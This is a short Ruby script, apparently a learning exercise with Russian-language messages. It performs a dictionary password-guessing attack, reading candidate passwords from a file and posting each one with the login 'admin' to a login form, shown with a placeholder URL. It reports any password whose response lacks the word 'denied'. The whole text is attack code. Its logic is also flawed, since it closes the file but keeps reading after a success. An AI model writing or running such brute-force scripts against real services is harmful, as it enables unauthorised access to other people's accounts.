require 'net/http'
require 'uri'

def is_wrong_password? pass
  uri = URI.parse 'https://google.com'
  response = Net::HTTP.post_form(uri,:login => "admin",:password => pass).body

  if response.include? "denied"
    return true
  else
    return false
  end

end

input = File.open 'password.txt', 'r'

while (line = input.gets)
  line.strip!

  puts "Пробуем пароль #{line}..."

  if is_wrong_password? line
    puts "Пароль неверен!"
  else
    puts "Ваш пароль: #{line}"
    input.close
  end

  puts

end